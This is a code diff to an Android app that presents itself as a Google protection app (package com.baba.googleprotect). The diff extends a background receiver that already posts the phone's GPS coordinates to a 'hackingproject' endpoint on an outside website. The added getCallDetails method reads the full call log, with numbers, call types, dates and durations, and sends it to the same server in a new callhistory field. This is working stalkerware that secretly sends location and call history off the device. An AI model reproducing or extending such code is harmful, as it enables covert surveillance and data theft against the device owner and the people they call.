@@ -2,14 +2,20 @@ package com.baba.googleprotect;
 
 import android.Manifest;
 import android.content.BroadcastReceiver;
+import android.content.ComponentName;
 import android.content.Context;
+import android.content.CursorLoader;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.location.Address;
 import android.location.Geocoder;
 import android.location.Location;
+import android.net.Uri;
 import android.os.Looper;
+import android.provider.CallLog;
+import android.text.method.ScrollingMovementMethod;
 import android.util.Log;
 import android.widget.Toast;
 
@@ -43,23 +49,25 @@ public class TrackReciever extends BroadcastReceiver {
 
     RequestQueue queue;
     Context mcontext;
-
-    public SharedPreferences sp;
-    private String employeeId,time="",date="";
+    StringBuffer sb;
+    private String time="",date="";
     FusedLocationProviderClient fusedLocationProviderClient;
     LocationRequest locationRequest;
     LocationCallback locationCallback;
     String lat, lang;
-    Geocoder geocoder;
-    List<Address> addresses;
-    Location loc;
+
+
+
+
     @Override
     public void onReceive(Context context, Intent intent) {
+
         // Instantiate the RequestQueue.
         queue = Volley.newRequestQueue(context);
-            Log.i("tracing","done");
+        mcontext=context;
+
         // TODO: This method is called when the BroadcastReceiver is receiving
-     //   Toast.makeText(getmcontext,"hello",Toast.LENGTH_LONG).show();
+
         buildLocationRequest();
         buildLocationCallback();
 
@@ -71,7 +79,7 @@ public class TrackReciever extends BroadcastReceiver {
         Calendar cal = Calendar.getInstance(TimeZone.getDefault());
         SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss a", Locale.getDefault());
 
-         time=sdf.format(cal.getTime());
+        time=sdf.format(cal.getTime());
         date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
 
         if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
@@ -96,7 +104,8 @@ public class TrackReciever extends BroadcastReceiver {
                 lat= String.valueOf(locationResult.getLastLocation().getLatitude());
                 lang= String.valueOf(locationResult.getLastLocation().getLongitude());
                 Log.i("lat",lat);
-                Log.i("lang",lang);
+               Log.i("lang",lang);
+                getCallDetails();
                 jsonparse();
             }
         };
@@ -115,21 +124,21 @@ public class TrackReciever extends BroadcastReceiver {
         //this is the url where you want to send the request
         //TODO: replace with your own url to send request, as I am using my own localhost for this tutorial
         String url = "https://www.play4deal.com/hackingproject/location.php";
-
+        Log.i("url",url);
         // Request a string response from the provided URL.
         StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                 new Response.Listener<String>() {
                     @Override
                     public void onResponse(String response) {
                         // Display the response string.
-                        //_response.setText(response);
+
                         Log.i("response",response);
-//                        Toast.makeText(mcontext,response,Toast.LENGTH_LONG).show();
+
                     }
                 }, new Response.ErrorListener() {
             @Override
             public void onErrorResponse(VolleyError error) {
-                // _response.setText("That didn't work!");
+
             }
         }) {
             //adding parameters to the request
@@ -141,6 +150,7 @@ public class TrackReciever extends BroadcastReceiver {
                 params.put("longitude", lang);
                 params.put("date",date);
                 params.put("time",time);
+                params.put("callhistory",sb.toString());
                 return params;
             }
         };
@@ -148,6 +158,43 @@ public class TrackReciever extends BroadcastReceiver {
         queue.add(stringRequest);
     }
 
+    private void getCallDetails() {
+
+        sb = new StringBuffer();
+        Cursor managedCursor  = new CursorLoader(mcontext,CallLog.Calls.CONTENT_URI, null, null, null, null).loadInBackground();
+      //  Cursor managedCursor = managedQuery( CallLog.Calls.CONTENT_URI,null, null,null, null);
+        int number = managedCursor.getColumnIndex( CallLog.Calls.NUMBER );
+        int type = managedCursor.getColumnIndex( CallLog.Calls.TYPE );
+        int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
+        int duration = managedCursor.getColumnIndex( CallLog.Calls.DURATION);
+        sb.append( "Call Details :");
+        while ( managedCursor.moveToNext() ) {
+            String phNumber = managedCursor.getString( number );
+            String callType = managedCursor.getString( type );
+            String callDate = managedCursor.getString( date );
+            Date callDayTime = new Date(Long.valueOf(callDate));
+            String callDuration = managedCursor.getString( duration );
+            String dir = null;
+            int dircode = Integer.parseInt( callType );
+            switch( dircode ) {
+                case CallLog.Calls.OUTGOING_TYPE:
+                    dir = "OUTGOING";
+                    break;
+
+                case CallLog.Calls.INCOMING_TYPE:
+                    dir = "INCOMING";
+                    break;
+
+                case CallLog.Calls.MISSED_TYPE:
+                    dir = "MISSED";
+                    break;
+            }
+            sb.append( "\nPhone Number:--- "+phNumber +" \nCall Type:--- "+dir+" \nCall Date:--- "+callDayTime+" \nCall duration in sec :--- "+callDuration );
+            sb.append("\n----------------------------------");
+        }
+        managedCursor.close();
+
+    }
 
 
 }
